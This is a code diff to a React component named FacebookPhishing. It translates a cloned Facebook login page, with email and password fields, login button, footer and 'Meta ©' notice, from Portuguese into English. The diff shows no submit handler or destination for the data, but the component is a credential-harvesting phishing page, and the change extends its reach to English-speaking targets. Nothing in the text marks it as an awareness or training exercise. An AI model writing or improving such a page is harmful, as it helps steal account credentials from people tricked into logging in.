@@ -37,11 +37,11 @@ export default function FacebookPhishing() {
         <div className="fb-logo">facebook</div>
         <form className="fb-form" onSubmit={handleSubmit}>
           <div className="fb-title">
-            O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.
+            Facebook helps you connect and share with the people in your life.
           </div>
           <input
             type="text"
-            placeholder="Email ou telefone"
+            placeholder="Email or phone number"
             value={email}
             onChange={e => setEmail(e.target.value)}
             className="fb-input"
@@ -49,25 +49,25 @@ export default function FacebookPhishing() {
           />
           <input
             type="password"
-            placeholder="Senha"
+            placeholder="Password"
             value={senha}
             onChange={e => setSenha(e.target.value)}
             className="fb-input"
             required
           />
-          <button type="submit" className="fb-btn">Entrar</button>
+          <button type="submit" className="fb-btn">Log In</button>
           <div className="fb-links">
-            <a href="#">Esqueceu a senha?</a>
+            <a href="#">Forgot password?</a>
             <span>·</span>
-            <a href="#">Criar nova conta</a>
+            <a href="#">Create new account</a>
           </div>
-          {enviado && <div className="fb-alert">Aguarde...</div>}
+          {enviado && <div className="fb-alert">Please wait...</div>}
         </form>
         <div className="fb-footer">
-          <a href="#">Crie uma Página para uma celebridade, uma marca ou uma empresa.</a>
+          <a href="#">Create a Page for a celebrity, brand or business.</a>
         </div>
         <div className="fb-langs">
-          Português (Brasil) · English (US) · Español · Français (France) · Italiano · Deutsch · العربية · हिन्दी · 中文(简体) · 日本語
+          English (US) · Español · Français (France) · Italiano · Deutsch · العربية · हिन्दी · 中文(简体) · 日本語 · Português (Brasil)
         </div>
         <div className="fb-copy">Meta © 2025</div>
       </div>
